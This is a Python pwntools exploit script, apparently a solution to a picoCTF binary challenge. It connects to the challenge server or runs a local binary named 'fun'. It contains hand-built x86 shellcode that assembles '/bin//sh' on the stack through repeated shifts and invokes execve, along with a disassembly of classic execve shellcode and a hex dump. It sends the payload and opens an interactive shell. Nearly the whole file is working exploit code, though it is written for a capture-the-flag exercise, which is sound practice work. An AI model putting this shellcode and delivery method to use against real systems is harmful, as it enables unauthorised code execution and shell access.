from pwn import *

conn = "nc mercury.picoctf.net 40525"
HOST = conn.split(" ")[1]
PORT = conn.split(" ")[2]

# Allows you to switch between local/GDB/remote from terminal


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *execute+208
c
""".format(
    **locals()
)

shellcraft
# Binary filename
exe = "./fun"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

constants.SYS_execve

""" 
1. xor eax,
2. push binsh
3. execve binsh null null

08048060 <_start>:
8048060: 31 c0                 xor    %eax,%eax
8048062: 50                    push   %eax
8048063: 68 2f 2f 73 68        push   $0x68732f2f
8048068: 68 2f 62 69 6e        push   $0x6e69622f
804806d: 89 e3                 mov    %esp,%ebx
804806f: 89 c1                 mov    %eax,%ecx
8048071: 89 c2                 mov    %eax,%edx
8048073: b0 0b                 mov    $0xb,%al
8048075: cd 80                 int    $0x80
8048077: 31 c0                 xor    %eax,%eax
8048079: 40                    inc    %eax
804807a: cd 80                 int    $0x80
"""
shellcode = """
/* clear eax */
xor eax, eax
push eax
nop

xor eax, eax
mov al, 0x68
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x73
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x2f
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x2f
push eax
nop

xor eax, eax
mov al, 0x6e
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x69
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x62
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1
shl eax, 1

mov al, 0x2f
push eax
nop


/* execve optcode */
xor eax, eax
mov al, 0xb

mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80

/* exit optcode */
xor eax, eax
mov al, 1
int 0x80
"""


def adding_pad(instr: str):
    return "shl eax, 1"


p = start()

sh = asm(shellcode)
# sh = asm(shellcraft.sh())
# sh = b"\x90"

p.sendafter(b"run:\n", sh)

p.interactive()


""" 
cc 6a 68 68  2f 2f 2f 73  68 2f 62 69  6e 89 e3 68  │·jhh│///s│h/bi│n··h│
01 01 01 01  81 34 24 72  69 01 01 31  c9 51 6a 04  │····│·4$r│i··1│·Qj·│
59 01 e1 51  89 e1 31 d2  6a 0b 58 cd  80 0a        │Y··Q│··1·│j·X·│··│
"""
